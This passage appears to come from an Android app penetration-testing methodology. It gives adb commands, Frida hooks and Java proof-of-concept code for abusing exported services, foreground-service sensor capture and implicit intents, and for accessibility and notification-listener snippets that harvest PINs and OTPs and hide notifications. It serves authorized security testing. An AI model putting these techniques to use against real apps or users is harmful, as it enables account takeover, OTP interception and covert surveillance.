grep -rn 'handleMessage' out/sources/ -A30 | grep -nE 'getCallingUid|sendingUid|getField\("sendingUid"\)|checkCallingPermission'
```
  Confirm at runtime which thread the check runs on and what it returns:
```js
Java.perform(function () {
  var B = Java.use('android.os.Binder'), T = Java.use('java.lang.Thread'), P = Java.use('android.os.Process');
  B.getCallingUid.implementation = function () {
    var u = this.getCallingUid();
    console.log('[getCallingUid] ' + u + ' myUid=' + P.myUid() + ' thread=' + T.currentThread().getName());
    return u;
  };
});
```
- **Proof:** The trace showing `getCallingUid()` returning the target's own UID on a thread named
  `main` (or a handler thread) while your PoC app is the actual sender, and the privileged arm executing.
  If the app *does* reflect `sendingUid`, record that as a genuine negative — it is rare and worth noting.
- **Escalation:** Every `what` code (D06-032) is unauthenticated; the `replyTo` channel (D06-034) then
  leaks the results back to you.
- **Ruled out when:** The handler reads `Message.sendingUid` (by reflection or on a platform where it is
  available) and compares it, **or** the protocol carries a per-caller secret established over a channel
  the attacker cannot reach. A manifest `android:permission` is not a substitute — it gates the bind, not
  the messages (D06-003).

### D06-034 · `msg.replyTo` trusted as the result channel — and as a binder the target now holds

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the reply carries a token; otherwise `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-03 |
| **Applies to** | Apps whose `Messenger` protocol replies to `msg.replyTo` |
| **Maps to** | Google bound-service model; MASWE-0018; MASWE-0036 |

- **Test:** Two consequences of `replyTo`. First, the service sends its results to a `Messenger` the
  *caller* supplied, so results intended for a trusted peer are delivered to whoever asked. Second, the
  target now holds a binder handle into your process — which you can use to keep the interaction alive
  and to observe the target's own lifecycle.
- **How:** Bind to the exported service, `getBinder()` → `new Messenger(binder)`, then send every
  `what` value in the range you recovered, each with a `replyTo` `Messenger` of your own:
```java
Messenger target = new Messenger(binder);
Messenger mine = new Messenger(new Handler(Looper.getMainLooper(), m -> {
    Log.i("POC", "reply what=" + m.what + " data=" + m.getData());
    return true;
}));
for (int what = 0; what <= 64; what++) {
    Message msg = Message.obtain(null, what, 0, 0);
    msg.replyTo = mine;
    try { target.send(msg); } catch (RemoteException e) { Log.w("POC", what + " -> " + e); }
}
```
- **Proof:** Your PoC's `handleMessage` receiving the target's reply containing app data, with the PoC
  holding no permission. Log the `what` code alongside the payload so the table is reproducible.
- **Escalation:** Returned token → D15; combine with D06-024 and D06-025 — the `replyTo` binder is itself
  a transferable handle.
- **Ruled out when:** The service replies only to a `Messenger` it obtained from a trusted source (not from
  the incoming `Message`), or the replies carry no data the caller did not supply — demonstrate with the
  body-diff rule (D06-078), not with a status impression.

### D06-035 · Exported entry point that starts a `camera` / `microphone` / `location` foreground service

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null — rate on the capture); `broken_access_control.privilege_escalation` (null) for the permission-model bypass |
| **Attacker** | AM-03 |
| **Applies to** | **targetSdk 34+** (mandatory `android:foregroundServiceType`). The platform blocks background starts for while-in-use types unless the app is visible or exempt, so the PoC must start from a visible-app state or an exempt path — **record which, because it changes the severity.** |
| **Maps to** | `develop/background-work/services/fgs/service-types` (type ↔ permission table); `about/versions/14/behavior-changes-14`; ATT&CK T1541 (Foreground Persistence), T1513 (Screen Capture); MASWE-0018 |

- **Test:** At targetSdk 34 each FGS type maps to a capability. If any exported component — service,
  receiver or activity — can cause `startForegroundService()` with a sensor type, an unprivileged app
  triggers sensor capture under the victim's already-granted permissions.
- **How:**
```bash
grep -nB6 -A6 'foregroundServiceType="\(camera\|microphone\|location\|mediaProjection\)"' base_apktool/AndroidManifest.xml
adb shell am start-foreground-service -n com.target.app/.RecorderService
adb shell dumpsys activity services com.target.app | grep -iE 'isForeground|fgType|foregroundServiceType'
adb shell appops get com.target.app | grep -iE 'CAMERA|RECORD_AUDIO|FINE_LOCATION'
adb logcat -d | grep -i 'ForegroundServiceStartNotAllowedException'
```
- **Proof:** `dumpsys activity services` showing the service running with `fgType` including `microphone`,
  the mic privacy indicator lit, `appops` showing the while-in-use permission in the allowed/foreground
  state with no UI in front, and an audio file appearing in the app sandbox.
- **Escalation:** → D20 — exfiltrate the capture through the app's own upload path, or through D06-029.
- **Ruled out when:** The FGS start path is reachable only from a non-exported component, or the platform
  throws `ForegroundServiceStartNotAllowedException` for your caller on the API level under test — attach
  the logcat line as the negative's evidence.

### D06-036 · `specialUse` foreground service — compare the declared subtype with what the service does

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) when the work is sensor or PII collection |
| **Attacker** | AM-12 for the observation; the *finding* is a privacy/disclosure one about the app itself |
| **Applies to** | targetSdk 34+ |
| **Maps to** | `develop/background-work/services/fgs/service-types` (`specialUse` requires `<property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" …/>`, reviewed by Play); ATT&CK T1541 |

- **Test:** `specialUse` is the catch-all apps reach for to keep a persistent background process. The
  declaration must carry a subtype string explaining the use case. Compare the declared string with what
  the service actually does.
- **How:**
```bash
grep -n -A3 'specialUse' base_apktool/AndroidManifest.xml
grep -n 'PROPERTY_SPECIAL_USE_FGS_SUBTYPE' base_apktool/AndroidManifest.xml
adb shell dumpsys activity services com.target.app | grep -iE 'type=|isForeground'
```
  Then trace the work: Frida on `onStartCommand`, plus the proxy log for what it sends.
- **Proof:** The declared subtype (e.g. "device diagnostics") beside a proxy capture showing the service
  performing continuous location reporting or ad-tracking calls.
- **Escalation:** → D20 undisclosed background collection; a Play-policy issue as much as a security one.
- **Ruled out when:** The subtype string accurately describes the observed work, evidenced by a trace of
  the service's actual network and sensor activity over a full session.

### D06-037 · `systemExempted` FGS type claimed by an app with no qualifying role

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.privilege_escalation` (null) — background-execution restriction bypass |
| **Attacker** | n/a (app-configuration finding) |
| **Applies to** | targetSdk 34+ |
| **Maps to** | `develop/background-work/services/fgs/service-types` (`systemExempted` qualifying-conditions list: demo mode, Device Owner, Profile Owner, Emergency role, Device Admin, `SCHEDULE_EXACT_ALARM`/`USE_EXACT_ALARM`, or a VPN app) |

- **Test:** `systemExempted` is reserved and permitted only under specific conditions. An ordinary app
  declaring it is trying to obtain unrestricted background execution.
- **How:**
```bash
grep -n 'systemExempted' base_apktool/AndroidManifest.xml
adb shell dumpsys device_policy | grep -i 'owner'
adb shell dumpsys package com.target.app | grep -iE 'EXACT_ALARM|BIND_VPN|DEVICE_ADMIN'
adb shell dumpsys activity services com.target.app | grep -i 'type='
```
- **Proof:** `systemExempted` declared with **none** of the qualifying roles present on the device, and the
  service running indefinitely in the background. Report with the qualifying-condition evidence absent.
- **Escalation:** → D25 persistence; ATT&CK T1541.
- **Ruled out when:** The app holds one of the documented qualifying roles — name which, with the
  `dumpsys` line that shows it.

### D06-038 · FGS timeout budgets as a starvation attack on a security-relevant background task

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `application_level_denial_of_service_dos.high_impact_and_or_medium_difficulty` (P3) when the starved task is a revocation or policy refresh |
| **Attacker** | AM-06 / AM-09 (needs to slow the app's own endpoint) |
| **Applies to** | `shortService`: targetSdk 34+. The 6-hour `dataSync`/`mediaProcessing` cap: **targetSdk 35+ (Android 15).** |
| **Maps to** | `develop/background-work/services/fgs/service-types` (`shortService` ~3-minute limit, `Service.onTimeout(int, int)`, not sticky, cannot start other FGSs, ANR on overrun); `about/versions/15/behavior-changes-15` (6-hour cumulative cap per 24 h, `FOREGROUND_SERVICE_TYPE_MEDIA_PROCESSING`, `FGS_INTRODUCE_TIME_LIMITS`) |

- **Test:** Two budgets, one attack. `shortService` runs ~3 minutes from `startForeground()` and ANRs on
  overrun even when other valid FGSs exist. `dataSync` and `mediaProcessing` are capped at 6 cumulative
  hours per 24 on Android 15, after which `Service.onTimeout()` fires and a restart throws
  `ForegroundServiceStartNotAllowedException`. If the app uses either for a security-relevant task —
  uploading a wipe confirmation, pulling a revocation list, refreshing a policy — an attacker who can slow
  that task burns the budget and the task never completes.
- **How:**
```bash
grep -nE 'shortService|dataSync|mediaProcessing' base_apktool/AndroidManifest.xml
grep -rn 'onTimeout(' out/sources/
adb shell am compat enable FGS_INTRODUCE_TIME_LIMITS com.target.app
adb shell device_config put activity_manager data_sync_fgs_timeout_duration 3600000
# throttle the endpoint in Burp, drive the sync, then attempt another
adb logcat -d | grep -iE 'did not stop within its timeout|ANR in|ForegroundServiceStartNotAllowedException|onTimeout'
```
- **Proof:** The ANR log naming the component, or the second `startForeground` throwing
  `ForegroundServiceStartNotAllowedException` after the shortened budget is exhausted — **plus** evidence
  that the security task is incomplete and the app has no retry path.
- **Escalation:** → D15 — a revoked session stays live because the revocation pull never lands.
- **Ruled out when:** The security-relevant task runs on a path with a retry/backoff that survives the
  timeout (a `WorkManager` job with a retry policy, not a bare FGS), demonstrated by showing the task
  completing after the induced failure.

### D06-039 · Android 15 FGS start restrictions — the fallback path is the finding

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `application_level_denial_of_service_dos.high_impact_and_or_medium_difficulty` (P3) when a security control fails to re-arm |
| **Attacker** | n/a for the restriction; the fallback is rated on its own shape |
| **Applies to** | **targetSdk 35+ (Android 15)** |
| **Maps to** | `about/versions/15/behavior-changes-15` — `FGS_BOOT_COMPLETED_RESTRICTIONS` (blocks `dataSync`, `camera`, `mediaPlayback`, `phoneCall`, `mediaProjection`, `microphone` FGS types from a `BOOT_COMPLETED` receiver) and `FGS_SAW_RESTRICTIONS` (`SYSTEM_ALERT_WINDOW` exemption now requires a **visible** `TYPE_APPLICATION_OVERLAY` window; `View.getWindowVisibility()`, `View.onWindowVisibilityChanged(int)`) |

- **Test:** Two Android 15 changes break patterns apps depended on. An app that re-armed a protective
  capability at boot now throws. An app that kept an invisible overlay purely to retain a background-start
  privilege now fails — and **often falls back to something worse** (a notification trampoline, a
  `specialUse` FGS, or a visible overlay you can then attack).
- **How:**
```bash
adb shell am compat enable FGS_BOOT_COMPLETED_RESTRICTIONS com.target.app
adb shell am broadcast -a android.intent.action.BOOT_COMPLETED com.target.app
adb shell am compat enable FGS_SAW_RESTRICTIONS com.target.app
adb shell dumpsys window windows | grep -iE 'ApplicationOverlay|com.target.app'
adb logcat -d | grep ForegroundServiceStartNotAllowedException
```
- **Proof:** The exception in logcat, plus the control not re-armed, plus — the actual report — the
  fallback path visible in a version diff of the app.
- **Escalation:** → D21 (a security control that silently stops); → D04 if the fallback is a now-visible
  overlay you can tapjack.
- **Ruled out when:** The app does not start a restricted FGS type from `BOOT_COMPLETED` and does not rely
  on the SAW exemption, or the compat-flag test shows the capability re-arming cleanly.

### D06-040 · Background FGS launch used to acquire while-in-use permissions

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null) — a permission-model bypass with a privacy payload |
| **Attacker** | AM-03 |
| **Applies to** | Android 10+ for while-in-use semantics; Android 12+ for background FGS-launch restrictions. **Cite the API level you proved it on.** |
| **Maps to** | Google Android & Google Devices in-scope impact, "Activity & Intent Spoofing" — "unprivileged background Foreground Service (FGS) launches to gain while-in-use permissions"; "While-In-Use (WIU) Abuse: Retaining sensitive WIU/One-Time permissions past process death or reboot, or launching services from background with undesired access to sensitive WIU permissions"; ATT&CK T1541 |

- **Test:** Whether an unprivileged app can cause the target to start a foreground service **from the
  background** and thereby move a while-in-use permission into the allowed state without any UI being
  visible. This is a named, paid impact class in Google's own programme, and it is distinct from D06-035
  (which is about the type being reachable at all).
- **How:** Trigger the exported entry point with no visible activity belonging to either app, then:
```bash
adb shell dumpsys activity services com.target.app | grep -E 'isForeground|fgRequired|startForeground'
adb shell appops get com.target.app | grep -iE 'CAMERA|RECORD_AUDIO|FINE_LOCATION|COARSE_LOCATION'
adb shell dumpsys window | grep -i 'mCurrentFocus'   # prove nothing of the app was in front
```
- **Proof:** `appops` showing the while-in-use permission in the allowed/foreground state, `mCurrentFocus`
  showing the app was not in front, and a captured sensor artefact. Three captures, one sitting.
- **Escalation:** → D20; hiding the privacy indicator on top of this is a further named platform item.
- **Ruled out when:** The platform refuses the background start for your caller
  (`ForegroundServiceStartNotAllowedException` in logcat) on the API level under test, or the reachable
  entry point cannot request a while-in-use type.

### D06-041 · Attribute every declared `foregroundServiceType` — and every service — to its owning package namespace

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.privilege_escalation` (null) — a third party holds a sensitive background capability inside the app's UID |
| **Attacker** | AM-08 (malicious or compromised third-party SDK); AM-03 once an exported entry point can start that service |
| **Applies to** | targetSdk 34+ for the mandatory type declaration; all targetSdk for the service-ownership question |
| **Maps to** | `develop/background-work/services/fgs/service-types` (the full type ↔ permission table: `camera`/`FOREGROUND_SERVICE_CAMERA`, `microphone`/`FOREGROUND_SERVICE_MICROPHONE`, `location`, `health`, `mediaProjection`, `connectedDevice`, `dataSync`, `mediaProcessing`, `remoteMessaging`, `shortService`, `specialUse`, `systemExempted`); `about/versions/13/behavior-changes-13` (SDK-declared permissions auto-merge into the app manifest); MASWE-0018 |

- **Test:** Services *and* their foreground-service types arrive by manifest merge from AARs, so the
  declared capability set is larger than anything in the app's own source tree. Attribute each declared
  type to the class that declares it. A `dataSync`, `connectedDevice`, `location`, `camera` or
  `microphone` type on a service whose class sits in a **third-party namespace** means that SDK holds a
  persistent background capability running as the app's UID, under the app's granted runtime permissions
  — a capability the app's own team frequently cannot name when asked.
- **How:**
```bash
python3 - <<'PY2'
import xml.etree.ElementTree as ET
A='{http://schemas.android.com/apk/res/android}'
OWN='com.target.app'
app=ET.parse('base_apktool/AndroidManifest.xml').getroot().find('application')
rows=0
for e in app.findall('service'):
    n=e.get(A+'name') or '?'; t=e.get(A+'foregroundServiceType')
    if t:
        print(('FIRST-PARTY ' if n.startswith(OWN) else 'THIRD-PARTY '), t, n); rows+=1
print('# typed services =', rows)
PY2
grep -nE 'FOREGROUND_SERVICE_(CAMERA|MICROPHONE|LOCATION|CONNECTED_DEVICE|DATA_SYNC|MEDIA_PROJECTION)' base_apktool/AndroidManifest.xml
# attribute it to the dependency when you have the build tree
grep -nE 'ADDED from|MERGED from' app/build/outputs/logs/manifest-merger-release-report.txt | grep -i foregroundservice
# and confirm it actually runs with that type in a normal session
adb shell dumpsys activity services com.target.app | grep -iE 'fgType|foregroundServiceType|isForeground'
```
- **Proof:** A `foregroundServiceType` on a service in a third-party package namespace, plus
  `dumpsys activity services` showing that service running foreground with that type during ordinary app
  use — and, where the build tree is available, the merger report naming the responsible AAR.
- **Escalation:** Cross this table with D06-035: if any exported entry point can start that SDK's service,
  an unprivileged app triggers sensor capture inside third-party code running as the victim app. → D18 for
  the SDK's own configuration, D20 for the collection and the data-safety declaration.
- **Ruled out when:** Every declared type belongs to a first-party service whose stated purpose matches
  the type, and no third-party namespace declares one — evidenced by the attribution table with every row
  assigned to a named owner. "No SDK services" is only a true negative when the table was built from the
  **merged** manifest (D06-001), not from `app/src/main/AndroidManifest.xml`.

### D06-042 · Implicit `Intent` used to start or bind a service — the attacker answers

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); Critical when the forged answer is an entitlement or auth verdict |
| **Attacker** | AM-03 |
| **Applies to** | All. `bindService()` with an implicit Intent **throws from API 21**, so verify the real code path; `startService()` with an implicit Intent is not blocked the same way on older code paths, and package visibility at targetSdk 30+ narrows discovery but not delivery. |
| **Maps to** | Google `guide/components/intents-filters` — "Using an implicit intent to start a service is a security hazard because you can't be certain what service will respond to the intent, and the user can't see which service starts"; `privacy-and-security/security-tips` ("Never use implicit intents with `bindService()`"); Android Studio's "Implicit Internal Intent" ASI campaign; Bugcrowd's own remediation text for `broken_access_control.exposed_sensitive_android_intent` repeats the same warning |

- **Test:** The inverse direction. The victim binds or starts a service by action name; your app registers
  that action and becomes the provider of the answer. From that moment the victim is talking to
  attacker-controlled code over a channel it trusts implicitly.
- **How:**
```bash
grep -rn -B3 'startService(\|bindService(\|startForegroundService(' out/sources/ \
  | grep -vE 'setClassName|setComponent|setPackage|new Intent\(.*\.class'
```
  Any `Intent` built with only an action string and no `setPackage`/`setComponent`/`setClass` is the bug.
  Register a stub service with a matching filter and return crafted data from `onBind`.
- **Proof:** `adb shell dumpsys package com.attacker | grep -A5 'Service Resolver'` (or
  `dumpsys package resolvers service`) showing your stub resolving the action, your stub's `onBind`/
  `onStartCommand` firing (`adb shell dumpsys activity services com.attacker`), the intent extras you
  received logged in full, and the victim acting on the data you returned — visible in its UI or its next
  network request.
- **Escalation:** → D23 (a forged entitlement or licence verdict), → D17 (attacker-supplied data
  deserialised by the victim), → D08 if the extras you receive contain a `PendingIntent`.
- **Ruled out when:** Every start/bind Intent is explicit, verified by reading the construction site — an
  `Intent(action)` later given `setPackage()` is explicit enough for delivery but still resolves within
  that package only; say which form you found.

### D06-043 · The app binds a peer resolved by package name, with no signature check on the connection

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | All; the `<queries>` block at targetSdk 30+ is where the trusted peer names are written down |
| **Maps to** | Google `privacy-and-security/risks/insecure-machine-to-machine` (MASVS-CODE); D01's `<queries>` trust-graph item |

- **Test:** The client side of D06-020. When the app binds a partner service by `setPackage("com.partner")`
  and trusts what comes back, a sideloaded package with that name (on a device where the real partner is
  absent) becomes the app's data source. Read `<queries>` as the app's declared trust graph — each named
  package is a spoofing target.
- **How:**
```bash
sed -n '/<queries>/,/<\/queries>/p' base_apktool/AndroidManifest.xml
grep -n 'QUERY_ALL_PACKAGES' base_apktool/AndroidManifest.xml
grep -rn 'setPackage("' out/sources/ -B4 -A8 | grep -iE 'bindService|startService'
# is the peer's signature verified before the binder is trusted?
grep -rnE 'hasSigningCertificate|checkSignatures|GET_SIGNING_CERTIFICATES' out/sources/
```
- **Proof:** The bind site with a package-name target and an empty signature-verification grep, plus your
  stub (same `applicationId`, throwaway key) returning data the victim acts on.
- **Escalation:** → D17 if the returned object is deserialised; → D23 if it is an entitlement verdict.
- **Ruled out when:** The app calls `PackageManager.hasSigningCertificate()` (or `checkSignatures()`
  returning `SIGNATURE_MATCH`) for the peer package **before** using the returned binder, and handles the
  negative by disconnecting.

### D06-044 · `BIND_ALLOW_ACTIVITY_STARTS` handed to a third-party service

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null) — a delegated background activity launch |
| **Attacker** | AM-03 (the peer) or AM-08 |
| **Applies to** | **targetSdk 34+** |
| **Maps to** | `about/versions/14/behavior-changes-14` (`Context.BIND_ALLOW_ACTIVITY_STARTS`); `guide/components/activities/background-starts` |

- **Test:** Android 14 requires the *binder* to opt in with `BIND_ALLOW_ACTIVITY_STARTS` before a bound
  background service may launch activities. An app that passes this flag when binding to a **third-party**
  service hands that service the ability to launch activities using the app's foreground privilege — i.e.
  it lends out a phishing/overlay primitive.
- **How:**
```bash
grep -rn 'BIND_ALLOW_ACTIVITY_STARTS' out/sources/ -B8 -A4
grep -rn 'bindService(' out/sources/ | grep -v getPackageName   # correlate the bound component
```
- **Proof:** The flag used on a `bindService` whose Intent targets a package the app does not control
  (cross-check the `<queries>` list from D06-043), then your peer service launching an activity while the
  victim app is backgrounded — captured on video plus `dumpsys activity activities`.
- **Escalation:** → D04 (overlay/task-hijack phishing with the victim's foreground privilege).
- **Ruled out when:** The flag is used only on binds to the app's own package (`setPackage(getPackageName())`
  or an explicit component in the same APK).

### D06-045 · gRPC-over-binder — the `SecurityPolicy` is the caller check, not the manifest

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.privilege_escalation` (null); `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) on what the RPCs return |
| **Attacker** | AM-03 |
| **Applies to** | Google/GMS-family apps and anything using grpc-binder |
| **Maps to** | Local senior-researcher corpus, gRPC-over-binder section; MASWE-0018 |

- **Test:** A `<service android:exported="true">` with `<action android:name="grpc.io.action.BIND"/>` and
  **no** manifest permission looks alarming and is usually fine — the gate is the server's
  `SecurityPolicy`, evaluated at the RPC layer. **`onBind` succeeds either way, so a successful bind proves
  nothing.** Trace the policy before rating anything.
- **How:**
```bash
grep -n 'grpc.io.action.BIND' base_apktool/AndroidManifest.xml
grep -rn 'SecurityPolicy\|securityPolicy\|permitAll\|getPackagesForUid\|hasSignature\|isGoogleSigned' out/sources/
# the policy is usually built deep in the Dagger graph, not inline — follow the provider
grep -rn 'getSecurityPolicy\|Provider<.*SecurityPolicy>\|@Provides.*SecurityPolicy' out/sources/
```
  The robust pattern to look for: resolve the caller uid → `pm.getPackagesForUid(uid)` → require the
  package to be in an **explicit allow-list** AND the caller to be **Google-signed**, denying by default
  when the allow-list is empty.
- **Proof:** The `SecurityPolicy` implementation body, quoted by `file:line`. The bug is a policy that is
  `permitAll()`, checks only a **package name** without a signature check, or is constructed empty.
  Verified-holding examples from the corpus (record these as negatives when you meet them): SafetyHub
  `START_EMERGENCY_SHARING` and the `com.google.android.apps.wear.companion` bridge.
- **Escalation:** Enumerate the RPC surface and re-run D15 authorisation tests against each method.
  Dynamic confirmation needs a real gRPC-binder client — you cannot craft one from adb, so when you rely
  on the code trace alone, **say so in the report**.
- **Ruled out when:** The traced policy requires both an explicit allow-list membership and a signature
  check, denies by default on an empty list, and you have followed the DI provider to the concrete object
  rather than reading an interface.

### D06-046 · Privileged listener service declared **without** its `BIND_*` permission

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null) — rated on what the callback accepts |
| **Attacker** | AM-03 |
| **Applies to** | All. Declaration-side issue, independent of targetSdk. |
| **Maps to** | MASWE-0018 (Lack of Authentication or Authorization on App Components); MASVS-PLATFORM; Oversecured banking write-up "AIDL Interface Abuse — service exposes AIDL interface performing auth operations without validating calling UID/package" |

- **Test:** This is "validates the action but never the caller" in its purest form. A listener service is
  written on the assumption that its only caller is `system_server`; the bind permission is what makes
  that true. The docs state the `BIND_*` permission "strictly enforces that only the system can bind to
  your service". Remove it and any app can bind and drive the callback directly with objects it
  fabricated.
- **How:**
```bash
grep -nE 'android\.accessibilityservice\.AccessibilityService|android\.service\.notification\.NotificationListenerService|android\.service\.autofill\.AutofillService|android\.service\.quicksettings\.action\.QS_TILE|androidx\.car\.app\.CarAppService|com\.google\.android\.gms\.wearable\.(BIND_LISTENER|MESSAGE_RECEIVED|DATA_CHANGED)|android\.service\.voice|android\.app\.slice\.category\.SLICE|android\.service\.chooser\.ChooserTargetService' base_apktool/AndroidManifest.xml
```
  For each hit, read **upward** to the enclosing `<service>` and record whether the matching permission is
  present: `BIND_ACCESSIBILITY_SERVICE`, `BIND_NOTIFICATION_LISTENER_SERVICE`, `BIND_AUTOFILL_SERVICE`,
  `BIND_QUICK_SETTINGS_TILE`, `BIND_CHOOSER_TARGET_SERVICE`. Then bind from a zero-permission app with the
  declared action and drive the interface:
```java
Intent i = new Intent("android.service.notification.NotificationListenerService")
        .setPackage("com.target.app");
bindService(i, conn, Context.BIND_AUTO_CREATE);
```
  and check the handler:
```bash
grep -rnE 'Binder\.getCallingUid|getCallingPackage|getPackagesForUid|checkCallingPermission|enforceCallingPermission' out/sources/
```
- **Proof:** A `<service>` with the listener `<intent-filter>`, `android:exported="true"` and **no**
  `android:permission="android.permission.BIND_*"`, plus a non-null `IBinder` arriving in your PoC's
  `onServiceConnected`, plus a method call that returns data or mutates state. Capture the returned
  object in the attacker app's log.
- **Escalation:** Whatever the callback does with the `AccessibilityEvent` / `StatusBarNotification` /
  `FillRequest` it now accepts from you — token extraction → D15; OTP → D13.
- **Ruled out when:** Every listener `<service>` carries its matching `BIND_*` permission **and** the
  handler additionally checks `Binder.getCallingUid()` — the permission alone leaves the app trusting a
  system caller it never verifies, which matters the moment the app is also installed on an OEM build
  where that permission is held by more than `system_server`.

### D06-047 · The app's own `AccessibilityService`, and the app's exposure to someone else's

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when screen scrape plus gesture injection completes a transaction |
| **Attacker** | AM-04 (the user must enable the service — a single user action, not an exploit) |
| **Applies to** | All. `accessibilityDataSensitive` is **Android 16+**; `android:filterTouchesWhenObscured="true"` implicitly enables it. |
| **Maps to** | `guide/topics/ui/accessibility/service` (`canRetrieveWindowContent`, `canPerformGestures`, `dispatchGesture`, `AccessibilityNodeInfo.performAction`); `privacy-and-security/risks/tapjacking`; ATT&CK T1513 (Screen Capture), T1516 (Input Injection), T1663 (Remote Access Software); MASWE-0039 |

- **Test:** Two directions. (a) If the *target* ships an `AccessibilityService`, check the declaration and
  the bind permission (D06-046) and read what its callbacks do with events it is handed. (b) The
  higher-value direction for a banking or payments app: the target's **missing mitigations** against a
  third-party accessibility service — no `FLAG_SECURE` on sensitive screens, no `accessibilityDataSensitive`,
  no `filterTouchesWhenObscured`. Scope this honestly: the user must enable your service, so the finding
  is the victim app's exposure, not a platform bug.
- **How:**
```bash
grep -nA10 'android.accessibilityservice.AccessibilityService' base_apktool/AndroidManifest.xml
grep -rn 'canRetrieveWindowContent\|canPerformGestures\|dispatchGesture' out/res/xml/ out/sources/
grep -rn 'accessibilityDataSensitive\|FLAG_SECURE\|filterTouchesWhenObscured' out/sources/ out/res/layout/
adb shell settings get secure enabled_accessibility_services
```
  Build a stub a11y service with `canRetrieveWindowContent` and dump the victim's tree:
```java
AccessibilityNodeInfo root = getRootInActiveWindow();
// walk and log every getText() / getContentDescription()
```
- **Proof:** Your stub logging the victim's PIN entry, balance or OTP text, and — with
  `canPerformGestures` — `dispatchGesture()` completing a transfer. Video plus the log, with the
  precondition sentence ("the user enabled the service") stated in the report.
- **Escalation:** Full session and transaction control; → D04 UI redress, → D13.
- **Ruled out when:** The sensitive screens set `FLAG_SECURE` (so the node tree is unreadable), or the
  transaction-authorising controls set `filterTouchesWhenObscured` and the app runs on Android 16+ where
  `accessibilityDataSensitive` is honoured. Prove it by running the dump and getting empty text.

### D06-048 · `NotificationListenerService` as an OTP and `PendingIntent` siphon

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.two_fa_bypass` (P3) at the VRT default; request P1 `authentication_bypass` when the captured OTP completes an account takeover end to end |
| **Attacker** | AM-04 (the user grants notification access) |
| **Applies to** | All |
| **Maps to** | AOSP `NotificationListenerService.java` (permission, `SERVICE_INTERFACE`, `onNotificationPosted`, `getActiveNotifications`, `cancelNotification`, `snoozeNotification`); `reference/android/service/notification/NotificationListenerService` (`Notification.extras`, `EXTRA_TEXT`, `contentIntent`); `privacy-and-security/risks/sender-of-pending-intents` (names the listener as the acquisition vector); ATT&CK T1517 (Access Notifications), T1636.004 (SMS Messages); MASWE-0037; MASTG-TEST-0005 |

- **Test:** Once enabled, a listener receives `onNotificationPosted(StatusBarNotification)` for **every**
  app and can `getActiveNotifications()`, `cancelNotification(key)` and `snoozeNotification(key, ms)`. Two
  consequences for the victim app: its notification extras (message bodies, OTPs) are readable, and its
  notification **PendingIntents** are obtainable.
- **How:**
```bash
adb shell cmd notification allow_listener com.poc.attacker/.Listener
adb shell dumpsys notification --noredact | grep -iE 'pkg=com.target.app' -A12
```
```java
public void onNotificationPosted(StatusBarNotification sbn) {
  Bundle x = sbn.getNotification().extras;
  Log.i("POC", sbn.getPackageName() + " " + x.getCharSequence("android.text"));
  PendingIntent pi = sbn.getNotification().contentIntent;   // then send() it with a fillIn — see D08
}
```
- **Proof:** The OTP or message body in your stub's logcat with the victim package named, and/or a
  captured `contentIntent` successfully `send()`-ed with an attacker `fillIn`. Cancel the notification
  afterwards to show the user never sees it — that is what turns "read" into "intercept".
- **Escalation:** → D13 (MFA bypass), → D08 (mutable PendingIntent hijack).
- **Ruled out when:** The victim app does not put the code in the notification text (check `EXTRA_TEXT`,
  `EXTRA_BIG_TEXT` and the channel's `lockscreenVisibility`) **and** every notification `PendingIntent`
  carries `FLAG_IMMUTABLE` plus `FLAG_ONE_SHOT`.

### D06-049 · Sensitive fields not excluded from the Autofill `AssistStructure`

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-04 (the user enables a third-party autofill or accessibility consumer) |
| **Applies to** | API 26+ |
| **Maps to** | `identity/autofill/autofill-services` (`AssistStructure` traversal, `IMPORTANT_FOR_AUTOFILL_YES/NO/AUTO`, `setDataIsSensitive()`, `BIND_AUTOFILL_SERVICE`, action `android.service.autofill.AutofillService`); MASWE-0036, MASWE-0040, MASWE-0019 |

- **Test:** An enabled `AutofillService` receives an `AssistStructure` — the full view hierarchy of the
  foreground app, traversed via `WindowNode`/`ViewNode` with `getText()` and `getHint()`. Fields the app
  never intended to expose (a displayed balance, a one-time code, a decrypted note) are in it unless
  marked `IMPORTANT_FOR_AUTOFILL_NO`.
- **How:**
```bash
grep -rn 'importantForAutofill\|setImportantForAutofill\|IMPORTANT_FOR_AUTOFILL_NO\|setDataIsSensitive\|autofillHints' out/sources/ out/res/layout/
# empirical dump of what any accessibility-capable consumer sees
adb shell uiautomator dump /sdcard/ui.xml && adb pull /sdcard/ui.xml && grep -o 'text="[^"]*"' ui.xml
```
- **Proof:** The sensitive value present in the dumped hierarchy of the screen that displays it, with the
  screen name recorded.
- **Escalation:** → D20; combine with D06-047 when the same screens also lack `FLAG_SECURE`.
